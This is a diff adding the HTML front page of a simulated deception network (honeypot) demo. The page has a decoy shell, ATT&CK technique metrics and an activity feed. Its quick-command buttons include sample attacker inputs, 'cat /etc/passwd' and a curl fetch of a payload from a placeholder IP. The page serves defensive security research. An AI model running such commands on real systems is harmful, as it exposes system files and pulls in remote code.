@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#0b1019">
+  <title>ADN | Deception Network</title>
+  <link rel="stylesheet" href="/style.css">
+  <script src="/app.js" defer></script>
+</head>
+<body>
+  <div class="app-shell">
+    <aside class="sidebar">
+      <a class="brand" href="/" aria-label="Autonomous Deception Network home">
+        <span class="brand-mark">A</span>
+        <span><strong>ADN</strong><small>DECEPTION NETWORK</small></span>
+      </a>
+      <div class="side-label">WORKSPACE</div>
+      <a class="nav-item active" href="#overview"><span class="nav-icon">◈</span> Overview</a>
+      <a class="nav-item" href="#terminal"><span class="nav-icon">⌘</span> Decoy terminal</a>
+      <a class="nav-item" href="#activity"><span class="nav-icon">≋</span> Activity feed</a>
+      <div class="sidebar-bottom">
+        <div class="status-card">
+          <span class="status-dot"></span>
+          <div><strong>Local demo active</strong><small>Isolated simulator</small></div>
+        </div>
+        <p>Commands are simulated.<br>No network listener is exposed.</p>
+      </div>
+    </aside>
+
+    <main>
+      <header class="topbar">
+        <div class="breadcrumbs">Workspace <span>/</span> <strong>Overview</strong></div>
+        <div class="topbar-right"><span class="local-pill"><span class="status-dot"></span> LOCAL ONLY</span><span class="avatar">AD</span></div>
+      </header>
+
+      <section class="content" id="overview">
+        <div class="page-heading">
+          <div>
+            <div class="eyebrow"><span class="eyebrow-line"></span> SECURITY OPERATIONS / DEMO</div>
+            <h1>Deception overview</h1>
+            <p class="subtitle">Explore a safe, simulated decoy environment and review captured activity.</p>
+          </div>
+          <button class="button button-secondary" id="export-button" type="button"><span>↓</span> Export STIX feed</button>
+        </div>
+
+        <div class="notice"><span class="notice-icon">i</span><span><strong>Safe simulation mode</strong> &nbsp;This demo does not open SSH/HTTP/FTP ports and never executes input on your computer.</span></div>
+
+        <section class="metrics" aria-label="Activity summary">
+          <article class="metric-card"><div class="metric-label">OBSERVED COMMANDS <span class="metric-symbol">⌘</span></div><div class="metric-value" id="command-count">0</div><div class="metric-caption">Interactions in this database</div></article>
+          <article class="metric-card"><div class="metric-label">ATT&CK TECHNIQUES <span class="metric-symbol purple">◈</span></div><div class="metric-value" id="technique-count">0</div><div class="metric-caption">Unique technique IDs observed</div></article>
+          <article class="metric-card"><div class="metric-label">UNIQUE INDICATORS <span class="metric-symbol green">◎</span></div><div class="metric-value" id="indicator-count">0</div><div class="metric-caption">Candidate IOCs extracted</div></article>
+        </section>
+
+        <section class="terminal-panel panel" id="terminal">
+          <div class="panel-heading">
+            <div><span class="section-kicker">INTERACTIVE DECOY</span><h2>Simulated shell</h2></div>
+            <span class="service-pill"><span class="status-dot"></span> SSH PROFILE · SIMULATED</span>
+          </div>
+          <div class="terminal-window">
+            <div class="terminal-bar"><div class="window-dots"><i></i><i></i><i></i></div><span>decoy-node-01 — bash</span><span class="terminal-live">● LIVE</span></div>
+            <div class="terminal-output" id="terminal-output" aria-live="polite">
+              <div class="terminal-welcome">Autonomous Deception Network · local simulator<br>Type <span class="term-highlight">help</span> to see available commands.</div>
+            </div>
+            <form class="terminal-form" id="command-form">
+              <label class="prompt" for="command-input">analyst@decoy:<span id="cwd">/home/analyst</span>$</label>
+              <input id="command-input" name="command" autocomplete="off" spellcheck="false" maxlength="4096" placeholder="Enter a simulated command..." aria-label="Simulated command">
+              <button type="submit" aria-label="Run simulated command">Run <span>↵</span></button>
+            </form>
+          </div>
+          <div class="quick-commands"><span>TRY A COMMAND</span><button type="button" data-command="whoami">whoami</button><button type="button" data-command="ls /">ls /</button><button type="button" data-command="cat /etc/passwd">cat /etc/passwd</button><button type="button" data-command="curl http://203.0.113.8/payload">curl demo</button></div>
+        </section>
+
+        <section class="activity-panel panel" id="activity">
+          <div class="panel-heading activity-heading"><div><span class="section-kicker">DETECTION &amp; INTELLIGENCE</span><h2>Recent activity</h2></div><span class="event-count" id="event-count">0 EVENTS</span></div>
+          <div class="activity-table-wrap">
+            <table><thead><tr><th>TIME</th><th>INTERACTION</th><th>ATT&amp;CK</th><th>INDICATORS</th></tr></thead><tbody id="events-body"><tr class="empty-row"><td colspan="4">No activity yet. Try a command in the simulated shell.</td></tr></tbody></table>
+          </div>
+          <div class="table-footer"><span>Showing latest events from the local database</span><button type="button" id="refresh-button">↻ &nbsp;Refresh</button></div>
+        </section>
+        <footer>ADN DEMO <span>·</span> Built for safe, authorized security research</footer>
+      </section>
+    </main>
+  </div>
+</body>
+</html>
